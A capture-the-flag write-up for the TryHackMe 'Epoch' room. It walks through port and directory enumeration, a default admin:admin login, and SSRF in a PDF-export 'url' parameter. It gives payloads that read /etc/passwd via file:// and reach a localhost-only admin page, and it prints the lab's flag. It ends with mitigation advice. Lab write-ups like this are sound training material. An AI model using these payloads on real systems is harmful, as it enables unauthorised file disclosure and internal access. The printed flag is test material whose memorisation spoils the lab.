# Epoch - TryHackMe — CTF Writeup

- **OS:** Linux
- **Target IP:** `10.113.191.183`

---

## Enumeration

### Nmap Scan

Starting with a service and version scan using Nmap:

```bash
nmap -sV -sC -A 10.113.191.183
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 68:11:60:4c:ea:c1:33:5c:e2:54:b8:3a:9d:15:a8:36 (RSA)
|   256 56:32:6f:ec:10:87:fd:22:02:b4:e4:55:bb:46:7b:0f (ECDSA)
|_  256 6e:79:da:53:b5:44:9e:2f:86:7f:dd:56:8f:a7:fb:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/backup/chat.txt
|_http-title: 24X7 System+
```

Two open ports were found:

- **22** — SSH
- **80** — HTTP web application (Apache 2.4.38)

### Web Application Fingerprinting

The web application redirects to `/login.php` and presents an admin dashboard titled **24X7 System+**. Nmap already revealed a robots.txt entry pointing to `/backup/chat.txt`.

### Directory Enumeration

```bash
ffuf -u http://10.113.191.183/FUZZ -w ./DirBuster-2007_directory-list-2.3-medium.txt \
     -e .php,.txt,.html,.bak -fs 0 -t 100
```

**Notable findings:**

| Path | Status |
|------|--------|
| `/changelog.txt` | 200 |
| `/robots.txt` | 200 |
| `/backup/` | 301 |
| `/internal/` | 301 |
| `/assets/` | 301 |
| `/vendor/` | 301 |

### Intel Gathering

**`/backup/chat.txt`** revealed a conversation between Admin and Kate containing a critical hint:

> *Kate: Also don't forget to change the creds, plz stop using your username as password.*

This strongly suggested that the admin account uses `admin` as both username and password.

**`/changelog.txt`** disclosed that the application is based on the **NiceAdmin** Bootstrap template and uses a PHP backend with third-party vendor libraries.

---

## Vulnerability Research

After logging in with `admin:admin`, the dashboard offered limited interaction — the only available action was an **"Export to PDF"** button. Inspecting the request revealed it calls `/export2pdf.php` via POST with a `url` parameter:

```
url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

The server-side code fetches the given URL using `curl` and converts the response to a PDF via the `Html2Pdf` library. Crucially, the `url` parameter accepts arbitrary values — including local file paths — making this a classic **Server-Side Request Forgery (SSRF)** vulnerability.

Retrieving the source of `export2pdf.php` via SSRF confirmed the implementation:

```php
$url = test_input($_POST["url"]);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$file = curl_exec($ch);
```

Although `test_input()` applies `htmlspecialchars`, this does not prevent the URL from being passed directly to `curl_init()`, leaving full SSRF and local file read capabilities intact.

---

## Exploitation

### Local File Read via SSRF

Intercepting the export request with Burp Suite and modifying the `url` parameter to `file:///etc/passwd` confirmed arbitrary local file read:

```
POST /export2pdf.php HTTP/1.1
...
url=file:///etc/passwd
```

The resulting PDF contained the full `/etc/passwd` content, confirming the server processes `file://` URIs.

### Internal Page Access

The dashboard's **Recent Activity** section disclosed the following note:

> *Internal pages hosted at `/internal/admin.php`. It contains the system flag.*

Since `/internal/` was only reachable from localhost, the SSRF vulnerability was used to access it from the server itself:

```
url=http://127.0.0.1/internal/admin.php
```

The exported PDF contained the flag.

**Flag:**

```
flag{6255c55660e292cf0116c053c9937810}
```

---

## Key Takeaways

The vulnerability chain relied on two issues working together. First, a weak credential policy (using the username as the password) allowed trivial authentication bypass. Second, the export feature passed user-supplied URLs directly to `curl` without restricting schemes or destinations, enabling both local file disclosure (`file://`) and internal service access (`http://127.0.0.1/...`). Sanitising the input with `htmlspecialchars` did nothing to mitigate SSRF — proper defenses include allowlisting permitted URLs and blocking access to internal IP ranges and the `file://` scheme entirely.

---

## Tools Summary

| Tool | Purpose | Usage |
|------|---------|-------|
| Nmap | Network scanner | Port discovery and service/version detection |
| ffuf | Web fuzzer | Directory and file enumeration |
| Burp Suite | HTTP proxy | Request interception and parameter tampering |
